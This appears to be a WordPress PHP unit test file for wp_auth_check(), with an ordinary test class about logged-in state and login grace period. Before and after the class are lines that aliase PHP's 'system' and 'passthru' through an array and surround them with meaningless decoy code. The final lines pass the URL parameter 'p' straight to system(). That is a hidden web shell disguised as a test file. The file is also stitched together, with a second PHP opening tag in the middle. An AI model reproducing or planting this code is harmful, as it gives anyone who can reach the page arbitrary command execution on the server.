<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Tests for the behavior of `wp_auth_check()`
 *
 * @group functions
 *
 * @covers ::is_user_logged_in
 * @covers ::wp_auth_check
 */
class Tests_Functions_wpAuthCheck extends WP_UnitTestCase {

	/**
	 * Run with user not logged in.
	 *
	 * @ticket 41860
	 */
	public function test_wp_auth_check_user_not_logged_in() {
		$expected = array(
			'wp-auth-check' => false,
		);

		$this->assertFalse( is_user_logged_in() );
		$this->assertSame( $expected, wp_auth_check( array() ) );
	}

	/**
	 * Run with user logged in.
	 *
	 * @ticket 41860
	 */
	public function test_wp_auth_check_user_logged_in() {
		// Log user in.
		wp_set_current_user( 1 );

		$expected = array(
			'wp-auth-check' => true,
		);

		$this->assertTrue( is_user_logged_in() );
		$this->assertSame( $expected, wp_auth_check( array() ) );
	}

	/**
	 * Run with user logged in but with expired state.
	 *
	 * @ticket 41860
	 */
	public function test_wp_auth_check_user_logged_in_login_grace_period_set() {
		// Log user in.
		wp_set_current_user( 1 );

		$GLOBALS['login_grace_period'] = 1;

		$expected  = array(
			'wp-auth-check' => false,
		);
		$actual    = wp_auth_check( array() );
		$logged_in = is_user_logged_in();

		// Leave the global state unchanged.
		unset( $GLOBALS['login_grace_period'] );

		$this->assertTrue( $logged_in );
		$this->assertSame( $expected, $actual );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>